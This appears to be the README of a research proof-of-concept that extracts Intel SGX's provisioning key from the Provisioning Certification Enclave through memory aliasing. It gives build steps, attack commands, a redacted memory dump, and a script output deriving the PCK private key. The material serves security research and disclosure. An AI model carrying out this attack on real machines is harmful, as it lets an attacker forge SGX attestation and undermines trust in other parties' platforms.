# Extracting the Provisioning Key from Intel's Provisioning Certification Enclave (PCE)

This folder contains an end-to-end attack to extract the provisioning key from the Provisioning Certification Enclave (PCE). The attack leverages the `simple-read` primitive to access the provisioning key.

This attack consists of three enclaves; the PCE, which is signed and distributed by Intel, and both attacker enclaves, similar to the `simple-read` PoC.


## Build

### PCE

Download the Provisioning Certification Enclave (PCE) from [Intel](https://download.01.org/intel-sgx/sgx-linux/2.24/prebuilt_ae_2.24.tar.gz). Extract the file `psw/ae/data/prebuilt/libsgx_pce.signed.so` and copy it to this directory.  
Our attacks have been verified on release 2.24. Minor modifications to `main.c` may be required for other releases.

### Linux SGX driver
First, build and install the modified out-of-tree SGX driver by applying the
patches in `../patches/`. These patches ensure the EPC
pages are allocated at physical addresses that are not affected by the
interposer, thus preventing crashes when enabling the interposer. Additionally,
they provide an interface through which EPC pages can be allocated at
chosen physical addresses.
Make sure the in-tree SGX driver is disabled by adding `nosgx` to the kernel
command line arguments.

### SGX-Step

Build and install the modified SGX-Step library. This library is used to translate virtual to physical addresses, and modify the page tables.

### Attacker enclaves

Both attacker enclaves can be build using `make all`. This will also
build the BadRAM kernel module and helper library.

```
make clean
make all
make insmod
```

## Use
  
**Step 1: Define the alias function**

First, define the alias function in the `aliases.csv` file. This file will be
used to calculate the alias pa to the victim buffer.

**Step 2: Generate a report**

Generate a report to be signed by the PCE.

```
sudo ./generate_report
```

**Step 3: Start the attack**

The attacker script will:
  1. Start the PCE and attacker read enclave, allocating their pages so they alias.
  2. Request a signature from the PCE, which will have the PCE load in the provisioning key.
  3. Interrupt the PCE while the providioning key is on the stack.
  4. Capture the ciphertext of the provisioning key through the use of the interposer.
  5. Terminate the PCE and start the second attacker enclave at the same physical address as the PCE.
  6. Replay the provisioning key ciphertext into the second attacker enclave through the use of the interposer.

```
sudo ./app <path to aliases.csv>
```

**Step 4: Extract the provisioning key**

The attack will generate a memory dump of the selected PCE pages at `./pce-dump.bin`.
The provisioning key is a 128-bit secret located 0x21 bytes below the string "PAK_KEY_DER", e.g., at address `0x7850` in the memory dump below.

**Step 5: Compute the PCK**

The provisioning key is used to derive the Provisioning Certification Key (PCK). We provide a simple Python script to derive the PCK from the provisioning key.

```
pip install -r requirements.txt
python gen_pck.py <provisioning key in hex>
```

## Expected output

Below is an example memory dump from the PCE.
Note that the provisioning key and derived outputs have been redacted in this memory dump.

```
$ hexdump -C pce-dump.bin
[...]
00007800  50 38 de 2d f8 7f 00 00  70 38 de 2d f8 7f 00 00  |P8.-....p8.-....|
00007810  80 38 de 2d f8 7f 00 00  36 5e c0 2d f8 7f 00 00  |.8.-....6^.-....|
00007820  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00007830  60 42 de 2d f8 7f 00 00  10 80 dc 2d f8 7f 00 00  |`B.-.......-....|
00007840  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00007850  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00007860  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00007870  03 50 41 4b 5f 4b 45 59  5f 44 45 52 00 00 01 40  |.PAK_KEY_DER...@|
00007880  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00007890  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
000078a0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
000078b0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
000078c0  40 80 dc 2d f8 7f 00 00  80 39 de 2d f8 7f 00 00  |@..-.....9.-....|
000078d0  40 80 dc 2d f8 7f 00 00  00 82 dc 2d f8 7f 00 00  |@..-.......-....|
000078e0  40 42 de 2d f8 7f 00 00  cf 00 00 00 00 00 00 00  |@B.-............|
000078f0  f0 49 de 2d f8 7f 00 00  cf 44 c0 2d f8 7f 00 00  |.I.-.....D.-....|
00007900  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
```

The extracted provisioning key can be used to generate the PCK and corresponding private key.

```
$ python gen_pck.py ffffffffffffffffffffffffffffffff
pkey_seed: ffffffffffffffffffffffffffffffff
hash_drg_output:  5df2cc9e06c90a4acc102f919dbd0832ba8f3a3342eebc270a54c16e77c34a6ae71a10361ab7b80c
ECDSA Private Key: 0e2d4e870654582db10b90fac6a70d5933d96ea77b84122b0982f82b5ede5aa0
ECDSA Public Key (PCK): 0581b87ffa500f543629b0746b7df95b48d9258170a6755473e791b976a8714ac40eee351d1e41f2c62bd3267972fed4a644ae0025e823a43e2ed5b110ea2c69
```
